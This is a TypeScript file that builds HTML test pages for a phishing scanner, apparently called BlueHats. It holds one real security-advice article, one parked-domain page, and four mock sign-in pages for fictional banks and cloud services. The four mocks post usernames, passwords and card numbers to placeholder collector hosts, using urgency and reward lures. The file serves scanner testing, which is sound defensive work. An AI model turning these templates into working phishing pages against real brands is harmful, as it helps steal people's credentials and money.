const BASE_STYLE = `
  :root { color-scheme: light; }
  * { box-sizing: border-box; }
  body { margin: 0; font-family: "Segoe UI", system-ui, -apple-system, sans-serif; background: #f2f5f7; color: #17252b; }
  header { padding: 18px 32px; background: #0d2b33; color: #e8f6f2; display: flex; align-items: center; justify-content: space-between; }
  header strong { letter-spacing: 0.04em; }
  .fixture-banner { background: #8b6447; color: #fff7ec; font: 12px/1.5 ui-monospace, monospace; padding: 8px 16px; text-align: center; letter-spacing: 0.04em; }
  main { max-width: 980px; margin: 0 auto; padding: 40px 24px 72px; }
  h1 { font-size: clamp(28px, 4vw, 44px); margin: 0 0 12px; }
  h2 { margin-top: 32px; }
  p { line-height: 1.65; }
  .card { background: #fff; border-radius: 18px; padding: 28px; box-shadow: 0 12px 34px rgba(13, 43, 51, 0.1); max-width: 440px; margin: 32px auto; }
  label { display: block; font-size: 13px; font-weight: 600; margin: 16px 0 6px; }
  input { width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid #cfd9df; font-size: 15px; }
  button, .button { width: 100%; margin-top: 20px; padding: 13px; border: 0; border-radius: 999px; background: #0d6b63; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; display: block; text-align: center; text-decoration: none; }
  .muted { color: #5b6b72; font-size: 13px; }
  .grid { display: grid; gap: 18px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); margin-top: 24px; }
  .tile { background: #fff; border-radius: 16px; padding: 20px; border: 1px solid #e1e8ec; }
  footer { padding: 32px; color: #61727a; font-size: 12px; text-align: center; }
`;

function shell(title: string, body: string): string {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow">
  <title>${title}</title>
  <style>${BASE_STYLE}</style>
</head>
<body>
  <div class="fixture-banner">BLUEHATS DEMO FIXTURE · FICTIONAL BRAND · SAFE LOCAL PAGE FOR SCANNER TESTING</div>
  ${body}
  <footer>Controlled BlueHats demo fixture. No credentials are collected, stored or transmitted anywhere.</footer>
</body>
</html>`;
}

export function safePage(): string {
  return shell(
    'Spotting a phishing link — Northwind Bank Insights',
    `<header><strong>NORTHWIND BANK</strong><span>Insights</span></header>
    <main>
      <p class="muted">Security · 4 minute read</p>
      <h1>Spotting a phishing link before it costs you</h1>
      <p>Phishing links rarely look dramatic. They arrive in a familiar message, wear a familiar logo, and ask for one small action. The trick is to slow down for five seconds and read the address bar before you type anything.</p>
      <h2>Start with the domain, not the logo</h2>
      <p>A logo is an image. The domain is the part of the address that decides where your browser actually goes. Attackers can copy a logo in seconds; they cannot copy a domain they do not own.</p>
      <div class="grid">
        <div class="tile"><h3>Read right to left</h3><p>The registrable domain sits just before the first single slash. Everything before it is a subdomain someone else can label.</p></div>
        <div class="tile"><h3>Check the certificate story</h3><p>A padlock means the connection is encrypted. It does not mean the site is honest.</p></div>
        <div class="tile"><h3>Type it yourself</h3><p>If a message asks you to sign in, open the bank app or type the known address instead of following the link.</p></div>
      </div>
      <h2>What Northwind will never ask</h2>
      <p>We will never ask for your full card number, your one-time code, or your password by email or chat. If a page asks for those, close it and contact us through the number on the back of your card.</p>
      <p>This article is a controlled demo fixture for BlueHats Scanner. Northwind Bank is fictional.</p>
    </main>`,
  );
}

export function typosquatPage(): string {
  return shell(
    'Northwind Bank — Sign in',
    `<header><strong>NORTHWIND BANK</strong><span>Personal banking</span></header>
    <main>
      <div class="card">
        <h1 style="font-size:28px">Welcome back</h1>
        <p class="muted">Sign in to review balances, pay a bill or manage your card.</p>
        <form action="https://collect.drop.example/creds" method="post">
          <label for="user">Online banking ID</label>
          <input id="user" name="user" autocomplete="username" placeholder="Your banking ID">
          <label for="pass">Password</label>
          <input id="pass" name="password" type="password" autocomplete="current-password" placeholder="Password">
          <button type="submit">Sign in securely</button>
        </form>
        <p class="muted" style="margin-top:18px">Forgot your password? Verify your account to restore access. Your session may be suspended until you confirm your details.</p>
      </div>
    </main>`,
  );
}

export function homoglyphPage(): string {
  return shell(
    'Northwind Bank — Secure sign in',
    `<header><strong>NORTHWIND BANK</strong><span>Secure area</span></header>
    <main>
      <div class="card">
        <h1 style="font-size:28px">Secure sign in</h1>
        <p class="muted">We noticed a new device. Confirm your details to continue.</p>
        <form action="https://verify.collect.example/session" method="post">
          <label for="user">Email or banking ID</label>
          <input id="user" name="user" autocomplete="username">
          <label for="pass">Password</label>
          <input id="pass" name="password" type="password" autocomplete="current-password">
          <button type="submit">Continue</button>
        </form>
        <p class="muted" style="margin-top:18px">Northwind will never ask for your one-time code here.</p>
      </div>
    </main>`,
  );
}

export function claimPage(): string {
  return shell(
    'You have a Northwind reward waiting',
    `<header><strong>NORTHWIND REWARDS</strong><span>Claim centre</span></header>
    <main>
      <div class="card">
        <h1 style="font-size:28px">Claim your $250 loyalty bonus</h1>
        <p class="muted">Your account has been selected. Confirm your banking details within 15 minutes to release the reward.</p>
        <form action="https://rewards.collect.example/claim" method="post">
          <label for="user">Online banking ID</label>
          <input id="user" name="user" autocomplete="username">
          <label for="pass">Password</label>
          <input id="pass" name="password" type="password" autocomplete="current-password">
          <label for="card">Card number</label>
          <input id="card" name="card" inputmode="numeric" placeholder="0000 0000 0000 0000">
          <button type="submit">Claim reward</button>
        </form>
      </div>
    </main>`,
  );
}

export function clonePage(): string {
  return shell(
    'Acme Cloud — Sign in to your workspace',
    `<header><strong>ACME CLOUD</strong><span>Workspace</span></header>
    <main>
      <div class="card">
        <h1 style="font-size:28px">Sign in to your workspace</h1>
        <p class="muted">Acme Cloud keeps your team files, notes and projects in one place.</p>
        <form action="https://session-collect.example/portal" method="post">
          <label for="email">Acme ID</label>
          <input id="email" name="email" autocomplete="username" placeholder="you@company.com">
          <label for="pass">Password</label>
          <input id="pass" name="password" type="password" autocomplete="current-password">
          <button type="submit">Open dashboard</button>
        </form>
        <p class="muted" style="margin-top:18px">Forgot your password? Reset it from the official sign-in page. Manage members and review activity in your dashboard.</p>
      </div>
    </main>`,
  );
}

export function parkedPage(): string {
  return shell(
    'northwind-refunds.example — domain parked',
    `<header><strong>DOMAIN MARKET</strong><span>Parking</span></header>
    <main>
      <h1>This domain is parked</h1>
      <p>The domain <strong>northwind-refunds.example</strong> is listed for sale. The previous account has been suspended and this page no longer offers a service.</p>
      <p>If you followed a link expecting Northwind Bank, close this page and open the official banking app instead.</p>
      <div class="grid">
        <div class="tile"><h3>Domain for sale</h3><p>Make an offer through the registrar marketplace.</p></div>
        <div class="tile"><h3>No services</h3><p>No login, payments or support are available here.</p></div>
      </div>
    </main>`,
  );
}

export const FIXTURE_PAGES: Record<string, () => string> = {
  safe: safePage,
  typosquat: typosquatPage,
  homoglyph: homoglyphPage,
  claim: claimPage,
  clone: clonePage,
  parked: parkedPage,
};
